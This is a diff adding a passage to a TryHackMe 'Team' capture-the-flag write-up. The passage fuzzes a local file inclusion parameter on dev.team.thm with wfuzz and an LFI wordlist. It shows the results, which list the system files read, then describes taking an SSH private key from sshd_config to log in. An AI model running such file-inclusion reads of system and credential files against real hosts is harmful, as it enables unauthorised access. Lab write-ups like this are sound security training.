@@ -88,3 +88,35 @@ ftp:x:110:116:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
 sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
 ```
 We can see that (judging by which users have /bin/bash shell) there are 3 users - gyles,dale and root.
+Now to get most of it we'll spin up wfuzz to fuzz pages. I've used this wordlist with linux files - https://github.com/DragonJAR/Security-Wordlist/blob/main/LFI-WordList-Linux
+```
+wfuzz -u http://dev.team.thm/script.php?page=FUZZ -w LFI-WordList-Linux --hw 0
+
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://dev.team.thm/script.php?page=FUZZ
+Total requests: 771
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                     
+=====================================================================
+					-------redacted---------
+000000260:   200        78 L     339 W      2684 Ch     "/etc/sysctl.conf"
+000000251:   200        169 L    447 W      5990 Ch     "/etc/ssh/sshd_config"
+000000231:   200        66 L     412 W      2180 Ch     "/etc/security/time.conf"
+000000222:   200        107 L    663 W      3636 Ch     "/etc/security/group.conf"
+000000228:   200        74 L     499 W      2973 Ch     "/etc/security/pam_env.conf"
+000000226:   200        29 L     217 W      1441 Ch     "/etc/security/namespace.conf"
+000000230:   200        12 L     70 W       420 Ch      "/etc/security/sepermit.conf"                                                                   
+```
+It will return many files but the most important one is /etc/ssh/sshd_config which contains id_rsa key.
+
+![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/Tryhackme-Write-Ups/Team/images/lfi_sshkey.png?raw=true)
+
+Now we only need to copy the key to the file(without the hashes on the left) and chmod 600 and then we can simply use ssh command 
+to connect to the machine.
+```
+
+```
